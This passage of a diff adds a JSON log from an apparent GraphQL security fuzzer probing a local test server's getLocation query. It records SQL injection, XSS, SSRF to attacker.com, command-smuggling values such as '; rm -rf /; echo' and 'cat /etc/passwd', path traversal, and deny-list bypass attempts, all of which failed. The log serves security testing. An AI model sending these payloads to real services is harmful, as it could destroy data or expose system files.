+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-123-abc\") {\n    id\n    name\n    lat\n    lng\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:44:40.133698Z",
+    "count": 23,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:44:45.484402Z",
+    "count": 24,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101' OR '1'='1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:44:47.456769Z",
+    "count": 25,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:44:49.312544Z",
+    "count": 26,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://localhost:8080/admin\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:44:51.503349Z",
+    "count": 27,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101; cat /etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:44:53.419741Z",
+    "count": 28,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:44:55.605887Z",
+    "count": 29,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101<h1>Hello</h1>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:44:57.911658Z",
+    "count": 30,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery BypassedLoc: getLocation(locationID: \"loc-101\") {\n  getLocation\n  name\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.009,
+        "timestamp": "2025-10-05T16:45:00.648616Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:45:00.655060Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Syntax Error: Expected \"{\", found \":\".",
+              "locations": [
+                {
+                  "line": 2,
+                  "column": 18
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_PARSE_FAILED",
+                "exception": {
+                  "stacktrace": [
+                    "GraphQLError: Syntax Error: Expected \"{\", found \":\".",
+                    "    at syntaxError (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/error/syntaxError.js:15:10)",
+                    "    at Parser.expectToken (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1423:40)",
+                    "    at Parser.many (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1533:10)",
+                    "    at Parser.parseSelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:265:24)",
+                    "    at Parser.parseOperationDefinition (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:193:26)",
+                    "    at Parser.parseDefinition (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:131:23)",
+                    "    at Parser.many (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:1537:26)",
+                    "    at Parser.parseDocument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:109:25)",
+                    "    at Object.parse (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/parser.js:36:17)",
+                    "    at parse (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:208:34)"
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 31,
+    "timestamp": "2025-10-05T16:45:00.655136Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.009,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:45:02.882837Z",
+    "count": 32,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Location\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101\") {\n    id\n    loc_name\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:45:05.769919Z",
+    "count": 33,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"loc_name\" on type \"Location\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"loc_name\" on type \"Location\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:45:11.148293Z",
+    "count": 34,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"1' OR '1'='1' --\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:45:13.503731Z",
+    "count": 35,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:45:15.516305Z",
+    "count": 36,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://attacker.com/evilhook\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:45:17.257192Z",
+    "count": 37,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"; rm -rf /; echo\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:45:18.829042Z",
+    "count": 38,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:45:21.321885Z",
+    "count": 39,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<h1>Malicious HTML</h1>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:45:24.067786Z",
+    "count": 40,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-456\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-05T16:45:26.157705Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:45:26.162625Z",
+        "response_body": {
+          "data": {
+            "myLocation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 41,
+    "timestamp": "2025-10-05T16:45:26.162643Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.011,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery AliasedLocation {\n  myLocation: getLocation(locationID: \"loc-789\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-05T16:45:27.950600Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:45:27.955748Z",
+        "response_body": {
+          "data": {
+            "myLocation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 42,
+    "timestamp": "2025-10-05T16:45:27.955785Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.01,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:45:30.332194Z",
+    "count": 43,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Location\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"known-id-1\") {\n    id\n    naame \n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:45:32.619049Z",
+    "count": 44,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:45:38.117427Z",
+    "count": 45,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"1' OR '1'='1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:45:40.945545Z",
+    "count": 46,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<script>alert('xss')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:45:43.665384Z",
+    "count": 47,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://attacker.com/malicious_data\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:45:46.140343Z",
+    "count": 48,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"; rm -rf /; echo\") {\n    id\n    name\n  }\n}\n",
